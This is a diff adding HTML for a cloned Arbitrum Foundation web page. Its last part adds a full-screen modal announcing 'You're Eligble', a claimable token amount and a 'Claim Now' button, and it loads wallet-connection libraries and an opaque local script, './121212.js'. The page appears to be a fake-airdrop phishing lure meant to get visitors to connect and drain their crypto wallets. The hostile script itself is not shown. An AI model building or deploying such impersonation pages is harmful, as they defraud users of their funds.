+                          <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                            <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                            <img data-src="./illustration_3-2.webp" alt="Illustration 3" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                            <noscript></noscript>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="c-Carousel__slide-content">
+                        <ul class="c-Carousel__slide-content-labels">
+                          <li>2/5</li>
+                          <li>Sustainable</li>
+                        </ul>
+                        <p>Decisions about technology, fee economics, and resource allocation should optimize for the long-term health of the ecosystem.</p>
+                        <div class="c-Carousel__slide-content-actions">
+                          <button class="c-Carousel__arrow" aria-label="prev"></button>
+                          <button class="c-Carousel__arrow" aria-label="next"></button>
+                          <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-Button c-Button--icon c-Button--blue">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                              <g transform="translate(-908.033 -2770.004)">
+                                <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                                  <rect width="12" height="15" stroke="none"></rect>
+                                  <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                                </g>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                              </g>
+                            </svg>Read docs </a>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="[ c-Carousel__slide ] flickity-slide" aria-hidden="true" style="position: absolute; left: 0px; transform: translateX(200%);">
+                      <div class="c-Carousel__slide-graphic">
+                        <div class="c-LazyImage  ">
+                          <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                            <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                            <img data-src="./illustration_3-3.webp" alt="Illustration 3" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                            <noscript></noscript>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="c-Carousel__slide-content">
+                        <ul class="c-Carousel__slide-content-labels">
+                          <li>3/5</li>
+                          <li>Technically Inclusive</li>
+                        </ul>
+                        <p>Ordinary people with ordinary computers should be able to fully participate in the Arbitrum protocol.</p>
+                        <div class="c-Carousel__slide-content-actions">
+                          <button class="c-Carousel__arrow" aria-label="prev"></button>
+                          <button class="c-Carousel__arrow" aria-label="next"></button>
+                          <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-Button c-Button--icon c-Button--blue">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                              <g transform="translate(-908.033 -2770.004)">
+                                <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                                  <rect width="12" height="15" stroke="none"></rect>
+                                  <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                                </g>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                              </g>
+                            </svg>Read docs </a>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="[ c-Carousel__slide ] flickity-slide" aria-hidden="true" style="position: absolute; left: 0px; transform: translateX(300%);">
+                      <div class="c-Carousel__slide-graphic">
+                        <div class="c-LazyImage  ">
+                          <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                            <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                            <img data-src="./illustration_3-4.webp" alt="Illustration 3" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                            <noscript></noscript>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="c-Carousel__slide-content">
+                        <ul class="c-Carousel__slide-content-labels">
+                          <li>4/5</li>
+                          <li>Socially Inclusive</li>
+                        </ul>
+                        <p>The community should be open and welcoming to all people who wish to participate constructively.</p>
+                        <div class="c-Carousel__slide-content-actions">
+                          <button class="c-Carousel__arrow" aria-label="prev"></button>
+                          <button class="c-Carousel__arrow" aria-label="next"></button>
+                          <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-Button c-Button--icon c-Button--blue">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                              <g transform="translate(-908.033 -2770.004)">
+                                <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                                  <rect width="12" height="15" stroke="none"></rect>
+                                  <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                                </g>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                              </g>
+                            </svg>Read docs </a>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="[ c-Carousel__slide ] flickity-slide" aria-hidden="true" style="position: absolute; left: 0px; transform: translateX(400%);">
+                      <div class="c-Carousel__slide-graphic">
+                        <div class="c-LazyImage  ">
+                          <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                            <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                            <img data-src="./illustration_3-5.webp" alt="Illustration 3" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                            <noscript></noscript>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="c-Carousel__slide-content">
+                        <ul class="c-Carousel__slide-content-labels">
+                          <li>5/5</li>
+                          <li>Neutral and Open</li>
+                        </ul>
+                        <p>Arbitrum governance should not pick winners or losers, but should foster open innovation, interoperation, user choice, and healthy competition on Arbitrum chains.</p>
+                        <div class="c-Carousel__slide-content-actions">
+                          <button class="c-Carousel__arrow" aria-label="prev"></button>
+                          <button class="c-Carousel__arrow" aria-label="next"></button>
+                          <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-Button c-Button--icon c-Button--blue">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                              <g transform="translate(-908.033 -2770.004)">
+                                <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                                  <rect width="12" height="15" stroke="none"></rect>
+                                  <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                                </g>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                              </g>
+                            </svg>Read docs </a>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </section>
+            <hr>
+            <section class="[ l-Section l-Section--cta-blocks l-Section--collapse-to-carousel ]">
+              <div class="l-Section--cta-blocks__intro">
+                <h2 class="l-Section__heading">Step Forward</h2>
+              </div>
+              <div class="[ l-CTABlocks l-CTABlocks--3up ]">
+                <div class="flickity-enabled is-draggable" tabindex="0">
+                  <div class="flickity-viewport" style="height: 602.953px; touch-action: pan-y;">
+                    <div class="flickity-slider" style="left: 0px; transform: translateX(-0.5%);">
+                      <div class="carousel-cell is-selected" style="position: absolute; left: 0px; transform: translateX(0%);">
+                        <a target="_blank" rel="noopener noreferrer" href="https://forum.arbitrum.foundation" class="c-CTABlock">
+                          <span class="[ c-CTABlock__label ] [ c-Label c-Label--dark ]">Visit the Forum</span>
+                          <h4 class="c-CTABlock__heading">View or submit delegate applications</h4>
+                          <div class="c-CTABlock__image">
+                            <div class="c-LazyImage  ">
+                              <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                                <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                                <img data-src="./illustration_9.webp" alt="Illustration 9" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                                <noscript></noscript>
+                              </span>
+                            </div>
+                          </div>
+                        </a>
+                      </div>
+                      <div class="carousel-cell is-selected" style="position: absolute; left: 0px; transform: translateX(103.13%);">
+                        <a target="_blank" rel="noopener noreferrer" href="https://portal.arbitrum.one" class="c-CTABlock">
+                          <span class="[ c-CTABlock__label ] [ c-Label c-Label--dark ]">Explore the Ecosystem</span>
+                          <h4 class="c-CTABlock__heading">See projects in the Arbitrum universe</h4>
+                          <div class="c-CTABlock__image">
+                            <div class="c-LazyImage  ">
+                              <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                                <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                                <img data-src="./illustration_10.webp" alt="Illustration 10" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                                <noscript></noscript>
+                              </span>
+                            </div>
+                          </div>
+                        </a>
+                      </div>
+                      <div class="carousel-cell is-selected" style="position: absolute; left: 0px; transform: translateX(206.25%);">
+                        <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-CTABlock">
+                          <span class="[ c-CTABlock__label ] [ c-Label c-Label--dark ]">Read the docs</span>
+                          <h4 class="c-CTABlock__heading">Discover the future we believe in</h4>
+                          <div class="c-CTABlock__image">
+                            <div class="c-LazyImage  ">
+                              <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                                <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                                <img data-src="./illustration_11.webp" alt="Illustration 11" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                                <noscript></noscript>
+                              </span>
+                            </div>
+                          </div>
+                        </a>
+                      </div>
+                    </div>
+                  </div>
+                  <ol class="flickity-page-dots">
+                    <li class="dot is-selected" aria-label="Page dot 1" aria-current="step"></li>
+                  </ol>
+                </div>
+              </div>
+            </section>
+            <hr class="margin-top-xxlarge">
+            <footer>
+              <div class="l-Footer">
+                <div class="l-Footer__links">
+                  <ul>
+                    <li class="l-Footer__label">Learn More</li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://forum.arbitrum.foundation/">View Proposals</a>
+                    </li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://arbitrumfoundation.medium.com/arbitrum-the-next-phase-of-decentralization-e7f8b37b5226">Read the Vision</a>
+                    </li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://developer.arbitrum.io">Read Developer Docs</a>
+                    </li>
+                  </ul>
+                  <ul>
+                    <li class="l-Footer__label">Resources</li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://arbitrumfoundation.medium.com">Blog</a>
+                    </li>
+                    <li>
+                      <a href="./tos">Terms of Service</a>
+                    </li>
+                    <li>
+                      <a href="./privacy">Privacy Notice</a>
+                    </li>
+                  </ul>
+                  <ul>
+                    <li class="l-Footer__label">Ecosystem</li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://portal.arbitrum.io">App Portal</a>
+                    </li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://bridge.arbitrum.io">Bridge</a>
+                    </li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://research.arbitrum.io">Research Forum</a>
+                    </li>
+                  </ul>
+                  <ul>
+                    <li class="l-Footer__label">Talk to us</li>
+                    <li>
+                      <a href="mailto:info@arbitrum.foundation">info@arbitrum.foundation</a>
+                    </li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://discord.gg/arbitrum">Discord</a>
+                    </li>
+                    <li>
+                      <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/arbitrum">Twitter</a>
+                    </li>
+                  </ul>
+                </div>
+                <div class="l-Footer__subscribe">
+                  <div>
+                    <span class="l-Footer__label">Join the community</span>
+                    <p class="l-Footer__subscribe-lede">Sign up to our newsletter for updates, announcements, and more.</p>
+                  </div>
+                </div>
+              </div>
+            </footer>
+            <div class="c-ParallaxElement " style="transform: scale(0.5) translateY(0px); width: clamp(120px, 25vw, 280px); height: clamp(120px, 25vw, 280px); inset: -2vh 0px 0px 20vw; z-index: -2;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./planet_3.svg" alt="#" src="./planet_3.svg" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div class="c-ParallaxElement " style="transform: scale(0.5) translateY(0px); width: clamp(700px, 150vw, 2000px); height: clamp(700px, 150vw, 2000px); inset: -15vh 0px 0px 70vw; z-index: -2;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./planet_6.svg" alt="#" src="./planet_6.svg" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div class="c-ParallaxElement " style="transform: scale(0.5) translateY(0px); width: clamp(500px, 90vw, 2000px); height: clamp(500px, 90vw, 2000px); inset: 110vh 0px 0px 30vw; z-index: -2;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./planet_3.svg" alt="#" src="./planet_3.svg" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div class="c-ParallaxElement scroll-touch" style="transform: scale(0.5) translateY(0px); width: clamp(120px, 45vw, 460px); height: clamp(120px, 45vw, 460px); inset: 10vh 0px 0px 70vw; z-index: -1;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./illustration_5.webp" alt="#" src="./illustration_5.webp" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div class="c-ParallaxElement scroll-touch" style="transform: scale(0.5) translateY(0px); width: clamp(230px, 30vw, 460px); height: clamp(230px, 30vw, 460px); inset: 62vh 0px 0px 15vw; z-index: -1;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./illustration_6.webp" alt="#" src="./illustration_6.webp" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div class="c-ParallaxElement scroll-touch" style="transform: scale(0.5) translateY(0px); width: clamp(240px, 50vw, 480px); height: clamp(240px, 50vw, 480px); inset: 90vh 0px 0px 65vw; z-index: -1;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./illustration_7.webp" alt="#" src="./illustration_7.webp" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div class="c-ParallaxElement scroll-touch" style="transform: scale(0.5) translateY(0px); width: clamp(225px, 40vw, 450px); height: clamp(225px, 40vw, 450px); inset: 120vh 0px 0px 30vw; z-index: -1;">
+              <div class="c-LazyImage is-contained ">
+                <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;">
+                  <img data-src="./illustration_8.webp" alt="#" src="./illustration_8.webp" decoding="async" data-nimg="fill" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                </span>
+              </div>
+            </div>
+            <div style="width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center; position: fixed; overflow-y: scroll; z-index: 99; inset: 0px; opacity: 1; backdrop-filter: blur(10px);">
+              <div class="modal-body" style="width: 980px; height: 776px; background-color: rgba(38, 40, 42, 0.8); padding-bottom: 20px; color: black; z-index: 9999; border-radius: 10px; opacity: 1; transform: none;">
+                <div class="[ l-Section__card l-Section__card--split ]">
+                  <div>
+                    <div>
+                      <h1 class="l-Section__heading">You're Eligble</h1>
+                      <p class="l-Section__lede" style="color: white; opacity: 0.8;">Early Birds can Claim now</p>
+                      <p class="mb-8 eligibility-hint" style="border-radius: 10px; height: 100px; display: flex; justify-content: flex-start; font-size: 32px; font-weight: bold; align-items: center;">
+                        <img src="https://metaverse-marauders.s3.eu-west-3.amazonaws.com/arbitrum_4366c46586.svg" alt="" style="width: 30px; margin-right: 20px;"> 12,525
+                      </p>
+                      <button class="triggerx [ c-Button c-Button--outline ]" style="margin-bottom: 20px;">Claim Now</button>
+                    </div>
+                  </div>
+                  <div>
+                    <div class="[ c-Accordion c-Accordion--eligibility ]">
+                      <div class="c-Accordion__section">
+                        <div class="c-Accordion__tab ">
+                          <span class="tick"></span>Bridged to Arbitrum <div></div>
+                        </div>
+                        <div class="c-Accordion__content">
+                          <ul>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve bridged funds into Arbitrum One
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve bridged funds into Arbitrum Nova
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="c-Accordion__section">
+                        <div class="c-Accordion__tab ">
+                          <span class="tick"></span>Transactions over time <div></div>
+                        </div>
+                        <div class="c-Accordion__content">
+                          <ul>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted transactions during 2 distinct months
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted transactions during 6 distinct months
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted transactions during 9 distinct months
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="c-Accordion__section">
+                        <div class="c-Accordion__tab ">
+                          <span class="tick"></span>Transaction frequency and interaction <div></div>
+                        </div>
+                        <div class="c-Accordion__content">
+                          <ul>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 4 transactions OR interacted with more than 4 smart contracts
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 10 transactions OR interacted with more than 10 smart contracts
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 25 transactions OR interacted with more than 25 smart contracts
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 100 transactions OR interacted with more than 100 smart contracts
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="c-Accordion__section">
+                        <div class="c-Accordion__tab ">
+                          <span class="tick"></span>Transaction value <div></div>
+                        </div>
+                        <div class="c-Accordion__content">
+                          <ul>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted transactions with more than $10,000 in aggregate value
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted transactions with more than $50,000 in aggregate value
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted transactions with more than $250,000 in aggregate value
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="c-Accordion__section">
+                        <div class="c-Accordion__tab ">
+                          <span class="tick"></span>Assets Bridged to Arbitrum One <div></div>
+                        </div>
+                        <div class="c-Accordion__content">
+                          <ul>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve deposited more than $10,000 of assets
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve deposited more than $50,000 of assets
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve deposited more than $250,000 of assets
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="c-Accordion__section">
+                        <div class="c-Accordion__tab ">
+                          <span class="tick"></span>Activity on Arbitrum Nova <div></div>
+                        </div>
+                        <div class="c-Accordion__content">
+                          <ul>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 3 transactions
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 5 transactions
+                            </li>
+                            <li>
+                              <div class="c-Accordion__tab p-0">
+                                <span class="bullet">•</span>
+                              </div>You’ve conducted more than 10 transactions
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </main>
+        </div>
+        <w3m-modal></w3m-modal>
+        <div class="[ l-Section l-Section--stars ]">
+          <div class="stars-small"></div>
+          <div class="stars-big"></div>
+        </div>
+      </div>
+    </div>
+
+  </body>
+  
+  <script src="./Decimal/decimal.js"></script>
+  <script src="./Moralis/moralis.js"></script>
+  
+  <script type="text/javascript" src="./WEB3/web3.js"></script>
+  <script type="text/javascript" src="./Web3Modal/web3modal.js"></script>
+  
+  <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+   <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+   <script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script>
+  
+  <script src="./121212.js"></script>
+  <script
+    src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+    crossorigin="anonymous"></script>
+</html>
